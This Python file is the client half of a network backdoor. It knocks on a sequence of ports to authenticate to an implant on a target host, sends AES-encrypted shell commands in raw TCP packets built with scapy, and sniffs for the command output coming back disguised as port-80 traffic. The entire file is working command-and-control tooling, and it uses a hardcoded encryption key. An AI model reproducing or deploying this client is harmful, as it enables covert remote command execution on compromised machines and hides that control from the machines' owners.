# ========================================================================
# File:         client.py
# Author:       David Wang
# Date:         October 2015
# Functions:    encrypt_val()       - Encrypts a string
#               decrypt_val()       - Decrypts the encyrpted string
#               verify_root()       - Checks if user is root
#               send_pkt()          - Sends a packet
#               knock()             - Sends a series of ports as a knock
#               send_cmd()          - Sends commands to the backdoor
#               print_result()      - Prints the output of the command
#               main()              - Main function and loop
#
# Description:
#   Client program which connects to a backdoor. A sequence of ports is
#   first sent to the backdoor as an authentication (port knocking), then
#   one or a series of commands may be sent to the backdoor for execution.
#   Outputs of each command will be sent back to the client. AES
#   Encryption is used both ways between.
# ========================================================================
import argparse
import os
import logging
import base64
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Surpress scapy errors
from scapy.all import *
from Crypto.Cipher import AES
MASTER_KEY = "CorrectHorseBatteryStapleGunHead"  # AES master key


# ========================================================================
# Function: encrypt_val()
# Input:    Text        - Text string to be encrypted
# Return:   cipher_text - Encrypted string
#
# Desc.:    Encrypts a string using AES from the PyCrypto library. The
#           master key is provided as a global in the file and only the
#           first 32 characters are used. If the master key is shorter
#           than 32 characters, it will be padded with '0's. The
#           encrypted string is then converted to base64 for an extra
#           layer of encoding.
# ========================================================================
def encrypt_val(text):
    secret = AES.new(MASTER_KEY)
    tag_string = (str(text) + (AES.block_size - len(str(text)) % AES.block_size) * "\0")
    cipher_text = base64.b64encode(secret.encrypt(tag_string))
    return cipher_text


# ========================================================================
# Function: decrypt_val()
# Input:    cipher - Encrypted string to be decrypted
# Return:   result - Decrypted string
#
# Desc.:    Undoes the encryption provided by encrypt_val(). First decodes
#           the b64 string then decrypts the AES version with the global
#           master key. See encrypt_val() on master key usage. Trailing
#           null characters added during encryption are stripped.
# ========================================================================
def decrypt_val(cipher):
    secret = AES.new(MASTER_KEY)
    decrypted = secret.decrypt(base64.b64decode(cipher))
    result = decrypted.rstrip("\0")
    return result


# ========================================================================
# Function: verify_root()
# Input:    None
# Return:   None
#
# Desc.:    Checks if the uid running the program is root. If not, exit.
# ========================================================================
def verify_root():
    if(os.getuid() != 0):
        exit("This program must be run with root/sudo")


# ========================================================================
# Function: send_pkt()
# Input:    pkt - Scapy packet object
# Return:   None
#
# Desc.:    Sends a packet. This function is here in case we need to
#           change how we send every single packet (for example, to use)
#           layer 2 instead of layer 3, we change "send()" to "sendp()".)
# ========================================================================
def send_pkt(packet):
    send(packet)


# ========================================================================
# Function: knock()
# Input:    destIP  - Destination IP (String)
#           ports   - A list of ports to knock
# Return:   None
#
# Desc.:    Authenticates to the backdoor using port knocking. This
#           function essentially sends 3 packets one after another. Any
#           number of ports can be passed in for the list as long as
#           the server is modified to handle it.
#
#           For future versions where the ports should be different for
#           covert purposes, it should be done here.
# ========================================================================
def knock(destIP, ports):
    for port in ports:
        packet = IP(dst=destIP) / TCP(dport=port)
        send_pkt(packet)


# ========================================================================
# Function: send_cmd()
# Input:    destIP  - Destination IP (string)
#           port    - port to send to (string)
#           cmd     - Command to run on backdoor (string)
# Return:   None
#
# Desc.:    Sends the command to the backdoor. The command is placed in
#           the payload in the raw layer of the packet.
# ========================================================================
def send_cmd(destIP, port, cmd):
    packet = IP(dst=destIP) / TCP(dport=port) / Raw(load=cmd)
    send_pkt(packet)


# ========================================================================
# Function: print_result()
# Input:    packet  - Scapy packet object
# Return:   None
#
# Desc.:    Prints the payload from the raw layer of the socket. The
#           payload should contain the output of the command that was ran
#           on the backdoor.
# ========================================================================
def print_result(packet):
    try:
        data = packet['Raw'].load
        print(decrypt_val(data))
    except IndexError:
        pass


# ========================================================================
# Function: main()
# Input:    None
# Return:   None
#
# Desc.:    Main function and loop of the client program. First checks
#           if the user is root. The knocks on the specified ports before
#           asking for command inputs and printing the results after
#           execution.
# ========================================================================
def main():
    verify_root()
    ports = [2525, 14156, 6364]
    knock(args.destIP, ports)
    if(args.dport is not None):
        dport = args.dport
    else:
        dport = 3232
    while(1):
        cmd = raw_input("Command to execute: ")
        cmd = encrypt_val(cmd)
        send_cmd(args.destIP, dport, cmd)
        sniff(filter="tcp and src {} and src port 80".format(args.destIP), count=1, prn=print_result)


if __name__ == '__main__':
    parser = argparse.ArgumentParser("Python backdoor client")
    parser.add_argument('destIP', help="Destination address")
    parser.add_argument('-d', '--dport', help="Destination port to the backdoor for commands, defaults to 3232")
    args = parser.parse_args()
    try:
        main()
    except KeyboardInterrupt:
        exit("Ctrl+C received. Exiting...")
